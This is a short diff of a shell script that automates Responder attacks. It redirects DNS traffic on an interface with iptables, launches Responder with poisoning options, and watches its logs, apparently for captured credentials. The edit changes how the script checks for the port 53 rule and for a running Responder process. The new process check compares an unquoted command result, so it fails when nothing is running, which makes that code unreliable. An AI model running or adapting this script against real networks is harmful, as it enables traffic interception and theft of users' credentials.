@@ -4,7 +4,7 @@ echo '[*] running Responder attacks'
 
 iptables -t nat -vnL PREROUTING > /tmp/iptables.txt
 
-if ! cat /tmp/iptables.txt | grep "$1" | grep -q 53; then
+if ! cat /tmp/iptables.txt | grep "$1" | grep -q ' 53'; then
   iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
 fi
 
@@ -15,10 +15,10 @@ do
 	fi
 done
 
-[[ $(pgrep -f Responder.py) = '' ]] && {
+if [ $(pgrep -f Responder.py) = '' ]; then
 	#screen -dmS responder responder -I "$1" -r -d -w -F
 	responder -I "$1" -r -d -w -F &
-}
+fi
 
 inotifywait -e MODIFY -rm /usr/share/responder/logs | while read event
 do
